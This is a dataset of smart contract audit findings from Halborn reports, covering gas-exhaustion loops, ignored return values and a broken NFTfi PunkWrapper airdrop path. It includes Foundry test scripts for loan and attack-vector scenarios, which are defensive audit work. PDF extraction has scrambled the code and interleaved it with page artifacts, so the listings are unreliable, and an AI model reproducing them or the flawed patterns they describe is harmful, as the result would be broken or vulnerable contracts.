            "BSCEX_Launchpoolx_SmartContract",
            "Severity: Low"
        ]
    },
    {
        "title": "FOR LOOP OVER DYNAMIC ARRAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Code Location: BSCXNTS.sol: [Line #252] Dynamic array _halvingAtBlock is in control of caller and not bounded by any value. So in this case, dynamic array length can e anything. This array can go up to very large uint256 value, which is very large to exhaust the gas value. 14 Risk Level: Likelihood - 2 Impact - 3 Recommendations: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. In this case, if you want loop over _halvingAtBlock then the size of _halvingAtBlock should be restricted. ",
        "labels": [
            "Halborn",
            "BSCEX_Launchpoolx_SmartContract",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contract BSCXNTS.sol, there are few instances where external methods are being called and return value(bool) are being ignored. Code Location: BSCXNTS.sol: Line #381, Line #514 Line #224, Line #230, Line #233, Line #352, Line #366, 15 Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. ",
        "labels": [
            "Halborn",
            "BSCEX_Launchpoolx_SmartContract",
            "Severity: Low"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/BSCEX_Launchpoolx_SmartContract_Report_Halborn_v1.pdf",
        "body": "owner(), renounceOwnership(), transferOwnership(), In smart contracts Ownable.sol and BSCXNTS.sol, there are many methods like deposit(), totalLockInPool(), setPercentLPLevelRefer(), setAmountLPStakeLevelRefer setTeamAddressPool(), (), withdraw(), dev(), add(), lockOf() getNewRewardPerBlock(), and totalLock() are marked as public but they are never directly called by another function in the same contract or in any of its descendants, setReferralLPToken(), lastUnlockBlock(), set(), emergencyWithdraw(), unlock(), claimReward(), setStatus(), 16 so better to mark these methods as external. functions are cheaper than public functions in gas costs. In addition, external Code Location: Ownable.sol: Line #22, Line #41, Line #50 Line #105, Line #156, Line #161, Line #167, Line #173, BSCXNTS.sol: Line #179, Line #186, Line #307, Line #387, Line #410, Line #429, Line #439, Line #444, Line #455, Line #459, Line #463, Line #467, Line #504 17 Risk Level: Likelihood - 1 Impact - 1 Recommendations: If the function is not intended to call internally nor by their descendants as well then it is better to mark all these functions as external instead of public to save some gas. 3.6 STATIC ANALYSIS REPORT ",
        "labels": [
            "Halborn",
            "BSCEX_Launchpoolx_SmartContract",
            "Severity: Informational"
        ]
    },
    {
        "title": "AIRDROP RECEIVER FUNCTIONALITY DENIED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/NFTfi_Native_Punk_Wrapper_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "function in the contract of the offer used. The borrower can never recover the collateral from the Escrow if the collateral is wrap to use the airdrop functionality. The AirdropReceiver functionality in the PunkWrapper contract is unusable, as it reverts to the transferNFT() function when it is called by the _resolveLoan() The issue is that the airdropReceiver instance has to be sent to the borrower so then, be- ing the owner, can drain all the airdrops inside the contract. How- ever, punkWrapper is only prepared to transfer Punks, and then the AirdropReceiver that has to be sent to the borrower to claim the airdrop, reverts in the transaction because it is not prepared to transfer ERC721 Airdrop Functionality for the Punks is disabled and the borrower can never recover the collateral. The Proof of Concept is the test number 9 AirdropReceiver. Code Location: Listing 1: PunkWrapper.sol (Lines 30-35) ) external override returns ( bool ) { if ( address ( this ) == _sender ) { function transferNFT ( address _sender , address _recipient , address _nftContract , uint256 _nftId 24 25 26 27 28 29 30 31 32 33  PunkWrapper : sender must be owner \"); 34 35 36 37 } return true ; } else { } IPunks ( _nftContract ). transferPunk ( _recipient , _nftId ); require ( isOwner ( _sender , _nftContract , _nftId ) , \" IPunks ( _nftContract ). buyPunk ( _nftId ); 13 Risk Level: Likelihood - 5 Impact - 5 Recommendation: The remediation is adding the functionality for the PunkWrapper to send not only Native Punks, but also ERC721 NFTs. Remediation Plan: SOLVED: The NFTfi team fixed the issue in commit 529a1d25 by adding a try-catch to the transferNFT function. Listing 2: PunkWrapper.sol (Lines 35-38) function transferNFT ( address _sender , address _recipient , address _nftContract , uint256 _nftId 26 27 28 29 30 31 32 33 34  loans contract re - deploy 35  interfaceId ) { 36  , _nftId ); 37 38 39 40  _nftId ); 41 42  PunkWrapper : sender must be owner \"); 43 44 45 } return true ; return true ; } catch { } else { ) external override returns ( bool ) { // we have to check if we are wrapped - // ideally should be fixed in loan airdrop utils : // should update collateralWrapper , but that would need a try IERC721 ( _nftContract ). supportsInterface ( type ( IERC721 ). IERC721 ( _nftContract ). transferFrom ( _sender , _recipient if ( address ( this ) == _sender ) { IPunks ( _nftContract ). transferPunk ( _recipient , require ( isOwner ( _sender , _nftContract , _nftId ) , \" IPunks ( _nftContract ). buyPunk ( _nftId ); 14 46 47 } } 15 MANUAL TESTING 16 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 4.1 SCENARIOS TESTED  Test 1: General repayment cycle (Borrower - Escrow - Borrower)  Test 1.1: Attack vector: External user repays loan to steal the NFT (revert expected)  Test 2: General repayment cycle out of time (revert expected)  Test 3: General liquidation cycle (Borrower - Escrow - Lender)  Test 4: General liquidation cycle before agreement (revert expected)  Test 5: General repayment cycle out of time with renegotiation  Test 6: Attack vector: Borrower renegotiate their loan to steal the Punk (revert expected)  Test 7: General repayment cycle with promissory note transfer  Test 8: General repayment cycle with obligation receipt transfer  Test 8.2: Attack vector: Obligation receipt transfer and old owner of OR repay loan.  Test 9: General airdrop functionality (Airdrop receiver - Wrap - Unwrap) Script The following test environment was set up for the purposes of executing the above scenarios: Listing 3: PunkTest.t.sol // SPDX - License - Identifier : UNLICENSED 1 2 pragma solidity 0.8.4; 3 4 import \" forge - std / Test . sol \"; 5 import \" ../ src / NftfiHub . sol \" ; 6 import \" ../ src / loans / direct / loanTypes / DirectLoanFixedOfferRedeploy  . sol \"; 7 import \" @openzeppelin / contracts / utils / cryptography / ECDSA . sol \"; 8 import \" ../ src / mocks / NFT . sol \" ; 17 G N I T S E T L A U N A M using ECDSA for bytes32 ; NFTWrapper internal nftWrapper ; PunkWrapper internal punkWrapper ; NFT internal nftContract ; DummyPunks internal punkContract ; SimpleToken internal token ; SmartNft internal nftPromissoryNote ; SmartNft internal nftObligationReceipt ; NftfiHub internal nftFiHub ; DirectLoanCoordinator internal directLoanCoordinator ; DirectLoanFixedOfferRedeploy internal 9 import \" ../ src / mocks / NFTWrapper . sol \"; 10 import \" ../ src / test / DummyPunks . sol \" ; 11 import \" ../ src / nftTypeRegistry / nftTypes / PunkWrapper . sol \" ; 12 import \" ../ src / loans / direct / DirectLoanCoordinator . sol \" ; 13 import \" ../ src / mocks / SimpleERC20 . sol \" ; 14 import \" ../ src / permittedLists / PermittedAirdrops . sol \"; 15 import \" ../ src / permittedLists / PermittedNFTsAndTypeRegistry . sol \" ; 16 import \" ../ src / loans / direct / loanTypes / LoanData . sol \" ; 17 import \" ../ src / airdrop / AirdropReceiverFactory . sol \"; 18 19 contract punkTest is Test { 20 21 22 23 24 25 26 27 28 29 30 31  directLoanFixedOfferRedeploy ; 32  permittedNFTsAndTypeRegistry ; 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 address internal owner ; address internal admin ; address internal alice ; address internal bobby ; address internal carla ; address internal edgar ; address internal zeroo ; uint256 internal verifyingSignerPrivateKey ; address internal verifyingSigner ; address internal sender ; bytes4 [] internal selectors ; address [] internal airdopContracts ; address [] internal permittedErc20s ; PermittedAirdrops internal permittedAirdrop ; AirdropReceiver internal airdropReceiverToClone ; AirdropReceiver internal airdropReceiver ; AirdropReceiverFactory internal airdropReceiverFactory ; PermittedNFTsAndTypeRegistry internal 18 G N I T S E T L A U N A M 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 string [] internal contractKeys ; address [] internal contractAddresses ; string [] internal definedNftTypes ; address [] internal definedNftWrappers ; address [] internal permittedNftContracts ; string [] internal permittedNftTypes ; string [] internal loanTypes ; address [] internal loanContracts ; bool internal liquidated ; uint256 internal timeNow ; function setUp () public { /* *************** */ /* ADDRESSES SETUP */ /* *************** */ // ADDRESSES DECLARATION admin = vm . addr (0 x60DDD ); alice = vm . addr (0 xA71CE ); bobby = vm . addr (0 xB0BB1 ); carla = vm . addr (0 xCA47A ); edgar = vm . addr (0 xED6A4 ); zeroo = address (0) ; // 100 ETHER PER ADDRESS vm . deal ( admin , 100 ether ); vm . deal ( alice , 100 ether ); vm . deal ( bobby , 100 ether ); vm . deal ( carla , 100 ether ); vm . deal ( edgar , 100 ether ); // LABELING ADDRESSES vm . label ( admin , \" admin \" ); vm . label ( alice , \" alice \" ); vm . label ( bobby , \" bobby \" ); vm . label ( carla , \" carla \" ); vm . label ( edgar , \" edgar \" ); /* ***************** */ /* ENVIRONMENT SETUP */ /* ***************** */ // DEPLYING NFTWRAPPER vm . prank ( admin ); G N I T S E T L A U N A M 19 95 96 97 98 99 100 101 punkWrapper = new PunkWrapper () ; vm . prank ( admin ); nftWrapper = new NFTWrapper () ; // DEPLOYING NFT CONTRACT nftContract = new NFT ( address ( nftWrapper )) ; punkContract = new DummyPunks { value : 30000000 gwei }(  address ( punkWrapper )) ; 102 103 104 105 106 107 108 109 110 111 // MINT A PUNK TO ALICE vm . prank ( alice ); punkContract . mintPunk ( alice , 0) ; vm . prank ( carla ); nftContract . mintNFT (10) ; // DEPLOYING AND MINTING TOKEN vm . startPrank ( admin ); token = new SimpleToken ( \" token \" , \" TKN \" , 1000000  _000000000000000000 ); 112 113 114 115 116 117 118 119 120 121 122 123 token . transfer ( alice , 50 _000000000000000000 ); token . transfer ( bobby , 1000 _000000000000000000 ); token . transfer ( carla , 50 _000000000000000000 ); contractKeys . push ( ' PERMITTED_NFTS '); contractKeys . push ( ' PERMITTED_NFTS '); contractAddresses . push ( address ( nftContract )) ; contractAddresses . push ( address ( punkContract )) ; permittedErc20s . push ( address ( token )) ; // DEPLOYING NFTFI HUB nftFiHub = new NftfiHub ( admin , contractKeys ,  contractAddresses ); 124 125 126 address nftFiHubAddr = address ( nftFiHub ); // DEPLOYING PROMISORY NOTES AND OBLIGATION RECEPT  CONTRACTS 127 nftObligationReceipt = new SmartNft ( admin , address (  nftFiHub ) , address ( directLoanCoordinator ) , \" nftObligationReceipt \" ,  \" NOR \" , \" customURI \"); 128 nftPromissoryNote = new SmartNft ( admin , address ( nftFiHub ) ,  address ( directLoanCoordinator ) , \" nftPromissoryNote \" , \" NOR \" , \"  customURI \"); 129 nftObligationReceipt . setLoanCoordinator ( address (  directLoanCoordinator )) ; 20 G N I T S E T L A U N A M 130 nftPromissoryNote . setLoanCoordinator ( address (  directLoanCoordinator )) ; 131 132 133 // DEPLOYING DIRECT_LOAN_FIXED_OFFER_REDEPLOY directLoanFixedOfferRedeploy = new  DirectLoanFixedOfferRedeploy ( admin , nftFiHubAddr , permittedErc20s )  ; 134 address directLoanFixedOfferRedeployAddr = address (  directLoanFixedOfferRedeploy ); 135 136 137 138 139 // DEPLOYING DIRECT LOAN COORDINATOR loanTypes . push ( \" DIRECT_LOAN_FIXED_REDEPLOY \" ); loanContracts . push ( address ( directLoanFixedOfferRedeploy )); directLoanCoordinator = new DirectLoanCoordinator ( address (  nftFiHub ) , admin , loanTypes , loanContracts ); 140 141 142 // INITIALIZING DIRECT LOAN COORDINATOR directLoanCoordinator . initialize ( address ( nftPromissoryNote  ) , address ( nftObligationReceipt )) ; 143 nftObligationReceipt . setLoanCoordinator ( address (  directLoanCoordinator )) ; 144 nftPromissoryNote . setLoanCoordinator ( address (  directLoanCoordinator )) ; 145 146 147 148 149 // SETTING CONTRACTKEYS AND CONTRACTADDRRESSES contractKeys . push ( ' DIRECT_LOAN_COORDINATOR '); contractAddresses . push ( address ( directLoanCoordinator )) ; nftFiHub . setContract ( ' DIRECT_LOAN_COORDINATOR ' , address (  directLoanCoordinator )) ; 150 151 152 153 154 155 156 157 158 159 160 // REGISTRATION OF PERMITTED NFTS AND TYPES definedNftTypes . push ( ' NFT '); definedNftTypes . push ( ' PUNKS '); definedNftWrappers . push ( address ( nftWrapper )) ; definedNftWrappers . push ( address ( punkWrapper )) ; permittedNftContracts . push ( address ( nftContract )) ; permittedNftContracts . push ( address ( punkContract )) ; permittedNftTypes . push ( ' NFT '); permittedNftTypes . push ( ' PUNKS '); permittedNFTsAndTypeRegistry = new  PermittedNFTsAndTypeRegistry ( admin , nftFiHubAddr , definedNftTypes ,  definedNftWrappers , permittedNftContracts , permittedNftTypes ); 161 162 vm . stopPrank () ; 21 G N I T S E T L A U N A M 163 164  )); 165 166 // PERMITTED AIRDROPS SETTINGS selectors . push ( bytes4 ( keccak256 ( bytes ( \" mintNFT ( uint256 ) \")) airdopContracts . push ( address ( nftContract )) ; permittedAirdrop = new PermittedAirdrops ( admin ,  airdopContracts , selectors ); 167 168 169 170 // AIRDROP RECEIVER ( alt 2) vm . startPrank ( admin ); airdropReceiverFactory = new AirdropReceiverFactory (  address ( admin ) , address ( nftFiHub )); 171 airdropReceiverToClone = new AirdropReceiver ( address (  nftFiHub )); 172 permittedNFTsAndTypeRegistry . setNftType ( ' AirdropWrapper ',  address ( airdropReceiverToClone )) ; 173 174 175  ); 176 177 // SETTING CONTRACTS AND PERMISIONS permittedNftContracts . push ( address ( airdropReceiverToClone ) permittedNftTypes . push ( ' AIRDROP_RECEIVER '); nftFiHub . setContract ( ' AIRDROP_RECEIVER ', address (  airdropReceiverToClone )) ; 178 nftFiHub . setContract ( ' AIRDROP_FACTORY ' , address (  airdropReceiverFactory )) ; 179 nftFiHub . setContract ( ' PERMITTED_NFTS ' , address (  permittedNFTsAndTypeRegistry )) ; 180 nftFiHub . setContract ( ' PERMITTED_AIRDROPS ' , address (  permittedAirdrop )); 181 182 183 184 185 } // time update timeNow = block . timestamp ; vm . stopPrank () ; The following internal functions have been used for the complete execution of the tests: Listing 4: PunkTest.t.sol function getBobbyOfferSignature () internal returns ( LoanData . 1  Signature memory ) { 2 3 // DECLARING OFFER 22 G N I T S E T L A U N A M LoanData . Offer memory offer = declareOffer () ; // PREPARING SIGNATURE STRUCT LoanData . Signature memory signature = LoanData . Signature ({ } }) ; id := chainid () // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( // GETTING CHAIN ID uint256 id ; assembly { nonce : 0, expiry : timeNow + 10 days , signer : bobby , signature : hex \"1 c \" 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  getEncodedSignature ( signature ) , address (  directLoanFixedOfferRedeploy ) , id ) 23 24 25 26  message ); 27 28 29  signedMessage ); 30 31 32 33 34 35  ({ 36 37 38 39 40 41 42 nonce : 0, expiry : timeNow + 10 days , signer : bobby , signature : signaturesf return signaturefi ; }) ; ); abi . encodePacked ( getEncodedOffer ( offer ) , // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( // GETTING THE V , R , S OF THE SIGNED MESSAGE ( uint8 v , bytes32 r , bytes32 s) = vm . sign (0 xB0BB1 , bytes memory v_bytes ; if ( v == 27) { v_bytes = hex \" 1 b\" ;} else { v_bytes = hex \" 1c \" ;} bytes memory signaturesf = bytes . concat (r , s , v_bytes ); // BOBBY SIGNES LoanData . Signature memory signaturefi = LoanData . Signature 23 G N I T S E T L A U N A M } } }) ; return offer ; function declareOffer () internal returns ( LoanData . Offer // DECLARING OFFER LoanData . Offer memory offer = LoanData . Offer ({ loanPrincipalAmount : 10 _000000000000000000 , maximumRepaymentAmount : 12 _000000000000000000 , nftCollateralId : 0, nftCollateralContract : address ( punkContract ) , loanDuration : 10 days , loanAdminFeeInBasisPoints : 500 , loanERC20Denomination : address ( token ) , referrer : zeroo 43 44 45  memory ) { 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 function getBalances ( uint32 loanId ) internal { 62 ( uint256 loanPrincipalAmount , uint256 63  maximumRepaymentAmount , uint256 nftCollateralId , address  loanERC20Denomination , uint32 loanDuration , uint32  loanInterestRateForDuration , uint16 loanAdminFeeInBasisPoints ,  address nftCollateralWrapper , uint64 loanStartTime , address  nftCollateralContract , address borrower ) =  directLoanFixedOfferRedeploy . loanIdToLoan ( loanId ); liquidated = directLoanFixedOfferRedeploy . 64  loanRepaidOrLiquidated ( loanId ); 65 66 67  balanceOf ( admin )); 68  balanceOf ( alice )); 69  balanceOf ( bobby )); 70  balanceOf ( carla )); 71  punkIndexToAddress (0) ) ; 72 73 console . log ( \" \" ); console . log ( \" ****** LOAN DATA ****** \" ); console . log ( \" ****** BALANCES ****** \"); console . log ( \" Balance Of Admin console . log ( \" Owner of the NFT console . log ( \" Balance Of Carla console . log ( \" Balance Of Bobby console . log ( \" Balance Of Alice ---> \" , token . ---> \" , token . ---> \" , token . ---> \" , token . ---> \" , punkContract . 24 G N I T S E T L A U N A M ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , ---> \" , console . log ( \" loanDuration console . log ( \" loanStartTime console . log ( \" nftCollateralId console . log ( \" loanPrincipalAmount console . log ( \" nftCollateralWrapper console . log ( \" loanERC20Denomination console . log ( \" nftCollateralContract console . log ( \" maximumRepaymentAmount console . log ( \" interestRateForDuration console . log ( \" loanAdminFeeInBasisPoints console . log ( \" borrower console . log ( \" LOAN LIQUIDATED / REPAYED 74  loanPrincipalAmount ); 75  maximumRepaymentAmount ); 76  nftCollateralId ); 77  loanERC20Denomination ); 78  loanDuration ); 79  loanInterestRateForDuration ); 80  loanAdminFeeInBasisPoints ); 81  nftCollateralWrapper ); 82  loanStartTime ); 83  nftCollateralContract ); 84 85  ); 86 87 88 89  _signature ) internal pure returns ( bytes memory ) { 90  nonce , _signature . expiry ); 91 92 93  internal pure returns ( bytes memory ) { 94 95 96 97 98 99 100 101 102 103 _offer . loanERC20Denomination , _offer . loanPrincipalAmount , _offer . maximumRepaymentAmount , _offer . nftCollateralContract , _offer . nftCollateralId , _offer . referrer , _offer . loanDuration , _offer . loanAdminFeeInBasisPoints abi . encodePacked ( console . log ( \" \" ); return } } function getEncodedOffer ( LoanData . Offer memory _offer ) function getEncodedSignature ( LoanData . Signature memory return abi . encodePacked ( _signature . signer , _signature . ---> \" , borrower ); ---> \" , liquidated 25 G N I T S E T L A U N A M ); 104 105 106 } 107 } G N I T S E T L A U N A M 26 TEST 1: Script Listing 5: NFTFi.t.sol 174 175 176 177 178 179 180 181 182 function test_1 () public { // INITIAL STATE LOGS console . log ( \" ****** STATE 0 ( ENV ) ******* \"); console . log ( \" \" ); getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address (  directLoanFixedOfferRedeploy )) ; 183 184 185 186 // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10  _000000000000000000 ); 187 188 189 190 // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi =  getBobbyOfferSignature () ; 191 192 193 194 195 // ALICE ACCEPTS BOBBY 'S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer ,  signaturefi , borrowerSettings ); 196 197 198 199 200 201 202 203 204 205 206 207 208 209 G N I T S E T L A U N A M // LOGS console . log ( \" ****** STATE 1 ******* \"); console . log ( \" TX : ALICE ---> ACCEPT BOBBY 'S OFFER \" ); console . log ( \" \" ); getBalances (1) ; // 5 DAYS LATER console . log ( \" ---------------\" ); console . log ( \"5 DAYS LATER ... \" ); console . log ( \" ---------------\" ); console . log ( \" \" ); vm . warp (5 days ); 27 210 211 212 // ALICE PAY THE MONEY vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12  _000000000000000000 ); 213 214 215 216 217 218 219 220 221 } vm . prank ( alice ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log ( \" ****** STATE 2 ******* \"); console . log ( \" TX : ALICE ---> PAY BACK LOAN \"); console . log ( \" \" ); getBalances (1) ; G N I T S E T L A U N A M 28 Output G N I T S E T L A U N A M 29 TEST 1.1: Script Listing 6 // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 1 function test_13 () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // ALICE PAY THE MONEY // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT BOBBY ' S OFFER \") ; console . log (\" \") ; getBalances (1) ; // 5 DAYS LATER console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\"5 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - -\") ; vm . warp (5 days ); G N I T S E T L A U N A M 30 vm . prank ( carla ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 37 38  _000000000000000000 ); 39 40 41 42 43 44 45 46 47 48 49 } vm . prank ( carla ); directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : CARLA ---> PAY BACK LOAN \") ; console . log (\" \") ; getBalances (1) ; punkContract . punkIndexToAddress (0) ; G N I T S E T L A U N A M 31 Output G N I T S E T L A U N A M 32 TEST 2: Script Listing 7 // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 1 function test_2 () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // ALICE PAY THE MONEY // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT BOBBY ' S OFFER \") ; console . log (\" \") ; getBalances (1) ; // 15 DAYS LATER console . log (\" - - - - - - - - - - - - - - - -\") ; console . log (\"15 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - - -\") ; vm . warp (15 days ); G N I T S E T L A U N A M 33 vm . prank ( alice ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 12 37 38  _000000000000000000 ); 39 40 41 42 43 44 45 46 47 48 49 } vm . prank ( alice ); vm . expectRevert (\" Loan is expired \") ; directLoanFixedOfferRedeploy . payBackLoan (1) ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : ALICE ---> TRIES TO REPAY \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M 34 Output G N I T S E T L A U N A M 35 TEST 3: Script Listing 8 // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , 1 function test_3 () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; // 11 DAYS LATER vm . warp (11 days ); console . log (\" - - - - - - - - - - - - - - - -\") ; console . log (\"11 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - - -\") ; // BOBBY LIQUIDATES THE LOAN G N I T S E T L A U N A M 36 37 38 39 40 41 42 43 44 45 } vm . prank ( bobby ); directLoanFixedOfferRedeploy . liquidateOverdueLoan (1) ; // LOGS console . log (\"****** STATE 2 *******\") ; console . log (\" TX : BOBBY ---> LIQUIDATE LOAN \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M Output 37 TEST 4: Script Listing 9 // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 1 function test_4 () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // 3 DAYS LATER vm . warp (3 days ); console . log (\" - - - - - - - - - - - - - - -\") ; console . log (\"3 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - -\") ; // BOBBY LIQUIDATES THE LOAN // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M 38 37 38 39 40 41 42 43  EARLY \") ; 44 45 46 } vm . prank ( bobby ); vm . expectRevert () ; directLoanFixedOfferRedeploy . liquidateOverdueLoan (1) ; // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : BOBBY ---> TRIES TO LIQUIDATE LOAN TOO console . log (\" \") ; getBalances (1) ; G N I T S E T L A U N A M Output 39 TEST 5: Script Listing 10 // INITIAL STATE LOGS console . log (\"****** STATE 0 ( ENV ) *******\") ; console . log (\" \") ; getBalances () ; vm . prank ( alice ); punkContract . offerPunkForSaleToAddress (0 , 0 , address ( // TOKEN APPROVAL vm . prank ( bobby ); token . approve ( address ( directLoanFixedOfferRedeploy ) , 10 // PREPARING SINGNATURE LoanData . Offer memory offer = declareOffer () ; LoanData . Signature memory signaturefi = // ALICE ACCEPTS BOBBY ' S OFFER LoanData . BorrowerSettings memory borrowerSettings ; vm . prank ( alice ); directLoanFixedOfferRedeploy . acceptOffer ( offer , 1 function test_5 () public { 2 3 4 5 6 7 8 9  directLoanFixedOfferRedeploy )) ; 10 11 12 13  _000000000000000000 ); 14 15 16 17  getBobbyOfferSignature () ; 18 19 20 21 22  signaturefi , borrowerSettings ); 23 24 25 26 27 28 29 30 31 32 33 34 35 36 uint256 id2 ; // LOGS console . log (\"****** STATE 1 *******\") ; console . log (\" TX : ALICE ---> ACCEPT OFFER \") ; console . log (\" \") ; getBalances (1) ; // 12 DAYS LATER console . log (\" - - - - - - - - - - - - - - - -\") ; console . log (\"12 DAYS LATER ...\") ; console . log (\" - - - - - - - - - - - - - - - -\") ; vm . warp (12 days ); G N I T S E T L A U N A M 40 } ) ); assembly { id2 := chainid () abi . encodePacked ( uint256 _expiry = block . timestamp + 20 days ; // GETTING THE MESSAGE HASH bytes32 message = keccak256 ( // EIP712 STANDARD bytes32 signedMessage = ECDSA . toEthSignedMessageHash ( uint256 (1) , uint32 (30 days ) , uint256 (20 _000000000000000000 ) , uint256 (5 _000000000000000000 ) , abi . encodePacked ( bobby , uint256 (1) , _expiry ) , address ( directLoanFixedOfferRedeploy ) , id2 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57  message ); 58 59 60  signedMessage ); 61 62 63  ); 64 65 66 67  